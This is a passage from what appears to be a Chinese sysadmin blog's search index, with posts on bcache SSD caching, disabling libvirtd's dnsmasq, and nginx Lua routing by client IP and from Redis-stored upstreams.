make-bcache -C /dev/sdb1 挂接bcache0\n$ echo C_Set_UUID_VALUE \u0026gt; /sys/block/bcache0/bcache/attach $ mkfs.ext4 /dev/bcache0 $ mount /dev/bcache0 /mnt 修改硬盘写的方法，改成writeback(原来是writethrough)\n1.临时生效的方法（重启失效） $ echo writeback \u0026gt; /sys/block/bcache0/bcache/cache_mode 2.永久生效的方法 $ echo /dev/sda1 \u0026gt; /sys/fs/bcache/register 最后查看一下状态：\n$ bcache-status -s ","permalink":"https://rendoumi.com/posts/20240123-ssd_cache/","summary":"\u003cp\u003e\u003cimg alt=\"image-20240123113743682\" loading=\"lazy\" src=\"/posts/20240123-ssd_cache/image-20240123113743682.png\"\u003e\u003c/p\u003e\n\u003cp\u003e如上图，数据写到硬盘有两种方式，一种是Bcache用SSD做缓冲，加速最后的硬盘读写。另一种是直接读写硬盘，bypass模式。我们用的是第一种Bcache。\u003c/p\u003e\n\u003cp\u003e安装：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ yum install bcache-tools\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e/dev/sda是硬盘，/dev/sdb是ssd，  首先把两个盘的数据都擦干净了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ wipefs -a /dev/sda1 \u003cspan class=\"p\"\u003e;\u003c/span\u003e wipefs -a /dev/sdb1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e格式化hdd和ssd，注意参数不同\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ make-bcache -B /dev/sda1 \u003cspan class=\"p\"\u003e;\u003c/span\u003e make-bcache -C /dev/sdb1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e挂接bcache0\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e C_Set_UUID_VALUE \u0026gt; /sys/block/bcache0/bcache/attach\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ mkfs.ext4 /dev/bcache0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ mount /dev/bcache0 /mnt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e修改硬盘写的方法，改成writeback(原来是writethrough)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1.临时生效的方法（重启失效）  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e writeback \u0026gt; /sys/block/bcache0/bcache/cache_mode\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2.永久生效的方法  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e /dev/sda1 \u0026gt; /sys/fs/bcache/register\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最后查看一下状态：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ bcache-status -s\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"在linux下用SSD盘来加速HDD硬盘"},{"content":"服务器要跑dnsmasq，同时机器还跑着kvm，和libvirtd自带dnsmasq的冲突了，需要禁掉libvirtd的。\n方法很简单，如下：\nvirsh net-list Name State Autostart Persistent -------------------------------------------------- default active yes yes virsh net-autostart --disable default virsh net-destroy default 搞定.\n","permalink":"https://rendoumi.com/posts/20240123-kvm_disable_dnsmasq/","summary":"\u003cp\u003e服务器要跑dnsmasq，同时机器还跑着kvm，和libvirtd自带dnsmasq的冲突了，需要禁掉libvirtd的。\u003c/p\u003e\n\u003cp\u003e方法很简单，如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName                 State      Autostart     Persistent  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--------------------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefault              active     yes           yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-autostart --disable default  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-destroy default\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e搞定.\u003c/p\u003e","title":"如何禁止libvirtd自带的dnsmasq启动"},{"content":"公司的线上环境分为预发布和正式两个部分。\n其实两个部分是公用一个Nginx前端的。\n这样怎么分发呢？\n用lua即可，如果是公司来的某个固定ip，则分发到预发布，如果不是，就走正式环境。这样测试就简单多了，运维统一设置一个无线wifi，接入这个wifi就走某个固定ip，到的全是预发布环境，不用这个wifi就走正式环境，非常方便测试。\n用lua进行分发：\nlocation / { content_by_lua \u0026#39; myIP = ngx.req.get_headers()[\u0026#34;X-Real-IP\u0026#34;] if myIP == nil then myIP = ngx.req.get_headers()[\u0026#34;x_forwarded_for\u0026#34;] end if myIP == nil then myIP = ngx.var.remote_addr end if myIP == \u0026#34;公司出口IP\u0026#34; then ngx.exec(\u0026#34;@client\u0026#34;) else ngx.exec(\u0026#34;@client_test\u0026#34;) end \u0026#39;; } location @client{ proxy_next_upstream error timeout; proxy_redirect off; proxy_set_header Host $host; #proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-IP $http_x_forwarded_for; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; client_max_body_size 100m; client_body_buffer_size 256k; proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_buffer_size 8k; proxy_buffers 8 64k; proxy_busy_buffers_size 128k; proxy_temp_file_write_size 128k; proxy_pass http://client; } location @client_test{ proxy_next_upstream error timeout; proxy_redirect off; proxy_set_header Host $host; #proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-IP $http_x_forwarded_for; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; client_max_body_size 100m; client_body_buffer_size 256k; proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_buffer_size 8k; proxy_buffers 8 64k; proxy_busy_buffers_size 128k; proxy_temp_file_write_size 128k; proxy_pass http://client_test; } ","permalink":"https://rendoumi.com/posts/20240123-lua_ip_forward/","summary":"\u003cp\u003e公司的线上环境分为预发布和正式两个部分。\u003c/p\u003e\n\u003cp\u003e其实两个部分是公用一个Nginx前端的。\u003c/p\u003e\n\u003cp\u003e这样怎么分发呢？\u003c/p\u003e\n\u003cp\u003e用\u003ccode\u003elua\u003c/code\u003e即可，如果是公司来的某个固定ip，则分发到预发布，如果不是，就走正式环境。这样测试就简单多了，运维统一设置一个无线wifi，接入这个wifi就走某个固定ip，到的全是预发布环境，不用这个wifi就走正式环境，非常方便测试。\u003c/p\u003e\n\u003cp\u003e用lua进行分发：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocation / \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    content_by_lua \u003cspan class=\"s1\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            myIP = ngx.req.get_headers()[\u0026#34;X-Real-IP\u0026#34;]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            if myIP == nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                myIP = ngx.req.get_headers()[\u0026#34;x_forwarded_for\u0026#34;]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            if myIP == nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                myIP = ngx.var.remote_addr\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            if myIP == \u0026#34;公司出口IP\u0026#34; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                ngx.exec(\u0026#34;@client\u0026#34;)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                ngx.exec(\u0026#34;@client_test\u0026#34;)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocation @client\u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_next_upstream     error timeout\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_redirect          off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        Host \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e#proxy_set_header        X-Real-IP $remote_addr;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        X-Real-IP \u003cspan class=\"nv\"\u003e$http_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        X-Forwarded-For \u003cspan class=\"nv\"\u003e$proxy_add_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    client_max_body_size    100m\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    client_body_buffer_size 256k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_connect_timeout   180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_send_timeout      180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_read_timeout      180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffer_size       8k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffers           \u003cspan class=\"m\"\u003e8\u003c/span\u003e 64k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_busy_buffers_size 128k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_temp_file_write_size 128k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_pass http://client\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocation @client_test\u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_next_upstream     error timeout\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_redirect          off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        Host \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e#proxy_set_header        X-Real-IP $remote_addr;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        X-Real-IP \u003cspan class=\"nv\"\u003e$http_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        X-Forwarded-For \u003cspan class=\"nv\"\u003e$proxy_add_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    client_max_body_size    100m\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    client_body_buffer_size 256k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_connect_timeout   180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_send_timeout      180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_read_timeout      180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffer_size       8k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffers           \u003cspan class=\"m\"\u003e8\u003c/span\u003e 64k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_busy_buffers_size 128k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_temp_file_write_size 128k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_pass http://client_test\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Nginx下lua根据客户端ip进行分发"},{"content":"技术要求很简明：\nnginx分发请求的时候，upstream是由lua从redis中读取配置动态生成的，这样便于用程序动态修改。\n装好nginx+lua，过程不表。 把lua redis的模块配到路径中\nwget https://raw.github.com/nrk/redis-lua/version-2.0/src/redis.lua nginx配置如下：\nserver { listen 80; server_name _; server_name_in_redirect off; port_in_redirect off; root /root/html; location / { set $upstream \u0026#34;\u0026#34;; rewrite_by_lua \u0026#39; -- load global route cache into current request scope -- by default vars are not shared between requests local routes = _G.routes -- setup routes cache if empty if routes == nil then routes = {} ngx.log(ngx.ALERT, \u0026#34;Route cache is empty.\u0026#34;) end -- try cached route first local route = routes[ngx.var.http_host] if route == nil then local redis = require \u0026#34;redis\u0026#34; local client = redis.connect(\u0026#34;localhost\u0026#34;, 6379) route = client:get(ngx.var.http_host) end -- fallback to redis for lookups if route ~= nil then ngx.var.upstream = route routes[ngx.var.http_host] = route _G.routes = routes else ngx.exit(ngx.HTTP_NOT_FOUND) end \u0026#39;; proxy_buffering off; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_redirect off; proxy_connect_timeout 10; proxy_send_timeout 30; proxy_read_timeout 30; proxy_pass http://$upstream; } } 送进redis一些数据\nredis-cli =\u0026gt; SET localhost 127.0.0.1:49153 测试一下：\ncurl -i -X HEAD \u0026#34;http://127.0.0.1/\u0026#34; # -\u0026gt; 404，没这个域名 curl -i -X HEAD \u0026#34;http://localhost/\u0026#34; # -\u0026gt; 正常 ","permalink":"https://rendoumi.com/posts/20240123-lua_redis_nginx_upstream/","summary":"\u003cp\u003e技术要求很简明：\u003c/p\u003e\n\u003cp\u003enginx分发请求的时候，upstream是由lua从redis中读取配置动态生成的，这样便于用程序动态修改。\u003c/p\u003e\n\u003cp\u003e装好nginx+lua，过程不表。 把lua redis的模块配到路径中\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://raw.github.com/nrk/redis-lua/version-2.0/src/redis.lua  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003enginx配置如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  listen 80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  server_name _\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  server_name_in_redirect off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  port_in_redirect off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  root /root/html\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  location / \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eset\u003c/span\u003e \u003cspan class=\"nv\"\u003e$upstream\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    rewrite_by_lua \u003cspan class=\"s1\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- load global route cache into current request scope\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- by default vars are not shared between requests\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      local routes = _G.routes\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- setup routes cache if empty\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      if routes == nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        routes = {}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        ngx.log(ngx.ALERT, \u0026#34;Route cache is empty.\u0026#34;)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- try cached route first\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      local route = routes[ngx.var.http_host]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      if route == nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        local redis  = require \u0026#34;redis\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        local client = redis.connect(\u0026#34;localhost\u0026#34;, 6379)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        route        = client:get(ngx.var.http_host)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- fallback to redis for lookups\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      if route ~= nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        ngx.var.upstream = route\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        routes[ngx.var.http_host] = route\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        _G.routes = routes\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        ngx.exit(ngx.HTTP_NOT_FOUND)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 